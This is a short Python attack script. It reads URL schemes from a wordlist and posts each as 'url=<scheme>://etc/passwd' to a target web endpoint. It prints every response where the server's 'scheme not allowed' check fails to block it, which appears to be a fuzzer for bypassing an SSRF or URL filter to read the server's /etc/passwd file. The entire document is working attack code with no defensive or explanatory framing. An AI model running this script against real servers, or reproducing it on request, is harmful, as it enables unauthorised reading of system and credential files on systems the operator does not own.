import requests as req
import sys
url = sys.argv[1]
filepath = sys.argv[2]
file = open(filepath, 'r').read().split('\n')
for i in range(len(file)):
    data = 'url='+str(file[i])+'://etc/passwd'
    header = {
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
    }
    res = req.post(url, data=data, headers=header)
    if str('{"error":"The specified URL scheme is not allowed."}') not in res.text:
       print(data)
       print(res.text)
